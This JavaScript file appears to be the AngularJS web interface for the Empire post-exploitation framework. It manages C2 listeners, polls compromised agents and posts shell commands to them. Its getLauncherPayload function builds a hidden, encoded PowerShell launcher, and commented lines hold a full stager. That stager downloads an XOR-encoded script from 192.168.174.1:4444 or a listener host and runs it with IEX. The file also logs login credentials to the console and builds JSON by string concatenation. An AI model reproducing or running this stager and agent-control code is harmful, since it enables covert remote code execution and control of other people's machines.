
var app = angular.module("empire", []);
app.controller('main', ['$scope', function ($scope,$http)
{
  $scope.potato="It's a potato!";
  $scope.token="";

  if(window.location.href.split('?').length==2)
  {
    $scope.token="?"+window.location.href.split('?')[1];
    console.log("got token: "+$scope.token);  
  }
  else
  {
   token="";
   console.log("no token found");
   console.log("count is "+window.location.href.split('?').length);
  }

    // set up some timers
    window.setInterval(function()
    {
      if($scope.token=="")
      {
        console.log("token is '"+$scope.token+"'");
        $('#loginModal').modal('show');
        return;
      }

      $.get('api/listeners'+$scope.token,function(data) {
        //console.log('getting listeners');

        if(String($scope.listeners).length != String(data.listeners).length)
        {
          console.log("new listener data");
          $scope.listeners=data.listeners;
          $scope.$apply();
        }
      })

      $.get('api/agents'+$scope.token,function(data) {
        //console.log('getting agents');
        $scope.agents = data.agents;
        //$scope.$apply();
      })

      $.get('api/reporting'+$scope.token,function(data) {

        if(String($scope.reporting).length != String(data.reporting).length)
        {
          console.log("new reporting data");
          $scope.reporting=data.reporting;

          // this is a good place to refresh agent results
          if($scope.currentAgent != "")
          {
            console.log("refreshing results for "+$scope.currentAgent.name);
            console.log("length "+$scope.currentAgent.results.length);
            console.log("length "+$scope.agents[$scope.currentAgentNumber].results.length);
            $scope.currentResults=JSON.parse($scope.agents[$scope.currentAgentNumber].results).reverse();
          }

          $scope.$apply();
        }
      })
    
    },1000);    

    // some functions
    $scope.getLauncherPayload = function(listener,host)
    {
      console.log(listener+" is at "+host);
      $scope.currentListener=listener;
      $scope.launcherPayload="powershell.exe -NoP -sta -NonI -W Hidden -Enc ";
      //$scope.launcherPayload+=btoa("[SYstem.NET.SErVIcEPOinTMANAger]::EXPeCT100COntiNue = 0;$WC=NEW-OBJECt SystEM.NEt.WebClieNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEAdeRs.ADd('User-Agent',$u);$wC.PROXy = [SYstem.NEt.WEBRequeST]::DEfaultWEbPRoXy;$wc.ProXY.CredenTIAlS = [System.Net.CREDeNTiAlCACHE]::DEfAultNeTwOrkCRedeNTIAls;$K='402acb1c3e3f37da6e1bb6cacadc315d';$I=0;[CHAr[]]$B=([char[]]($WC.DOWnLoADSTRinG(\"http://192.168.174.1:4444/index.asp\")))|%{$_-BXOR$k[$i++%$K.LengTh]};IEX ($B-JoiN'')";


      //$scope.launcherPayload+=btoa("[SySTeM.NET.SeRVicEPOintMAnageR]::ExPECt100COnTINue = 0;$wc=New-ObJEcT SySTEM.NeT.WEbCLIENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HeADERS.ADD('User-Agent',$u);$wC.PrOxy = [SYstEM.NEt.WebREQuesT]::DEfaulTWeBProxY;$wc.ProXy.CredeNTiAls = [SYsTEm.NeT.CReDenTIAlCACHe]::DefAUltNEtwOrKCredEnTiAls;$K='402acb1c3e3f37da6e1bb6cacadc315d';$I=0;[cHAr[]]$b=([char[]]($WC.DoWNLoadStRiNg(\""+host+"/index.asp\")))|%{$_-bXOR$K[$i++%$K.LENGth]};IEX ($B-JoIN'')");
      $('#launcherModal').modal('show');
    }

    $scope.killListener = function(listener)
    {
      $.ajax({url: 'api/listeners/'+listener+$scope.token, type: 'DELETE'});
    }

    $scope.newListener = function()
    {
      console.log("getting listener options");
      
      $.get('api/listeners/options'+$scope.token,function(data) {
          $scope.listenerOptions=data.listeneroptions[0];
          $scope.$apply();
          console.log("got listener options "+JSON.stringify(data.listeneroptions));
          console.log("name is "+$scope.listenerOptions.Name.Value);
          $('#newListenerModal').modal('show');
        })
    }

    $scope.createListener = function()
    {
      var listenerString='{"Name":"'+$scope.listenerOptions.Name.Value+'","Host":"'+$scope.listenerOptions.Host.Value+'","Port":'+$scope.listenerOptions.Port.Value+'}'
      console.log("WOOOOO! "+listenerString);
      $.ajax({
        type:'POST',
        url:'api/listeners'+$scope.token,
        data:listenerString,
        contentType:"application/json; charset=utf-8",
        dataType:"json",
        success:function(data)
        {
          console.log(String(data));
          $('#newListenerModal').modal('hide');
        }});
    }

    $scope.empireLogin = function()
    {
      var loginString='{"username":["'+$scope.username+'"],"password":["'+$scope.password+'"]}'
      console.log("WOOOOO! "+loginString);
      $.ajax({
        type:'POST',
        url:'api/admin/login'+$scope.token,
        data:loginString,
        contentType:"application/json; charset=utf-8",
        dataType:"json",
        success:function(data)
        {
          console.log(JSON.stringify(data));
          $scope.token="?token="+data.token;
          window.location=window.location+$scope.token;
          $('#loginModal').modal('hide');
        }});
    }

    $scope.currentAgent='';
    $scope.switchAgent = function(agent)
    {
      //$scope.currentAgent=agent;
      $scope.currentResults=[""];
      for(x=0;x<$scope.agents.length;++x)
      {
        console.log("LOOP!! "+$scope.agents[x].name);

        if($scope.agents[x].name==agent)
        {
          $scope.currentAgentNumber=x;
          $scope.currentAgent=$scope.agents[x];
          $scope.currentResults=JSON.parse($scope.agents[x].results).reverse();
          //$scope.$apply();  
        }
      } 
    };

    $scope.currentCommand="";

    $scope.executeCommand = function(command)
    {
      console.log("executing "+$scope.currentCommand);
      console.log("executing "+command);
      console.log("what "+$scope.currentAgent.name);

      $.ajax({
        type:'POST',
        url:'api/agents/'+$scope.currentAgent.name+'/shell'+$scope.token,
        data: '{"command":"'+command+'"}',
        contentType:"application/json; charset=utf-8",
        dataType:"json",
        success:function(data)
        {
          console.log("exec success");
          $scope.currentCommand="";
          //$scope.$apply();
        }});
    };

}]);

console.log("I'm still here!");
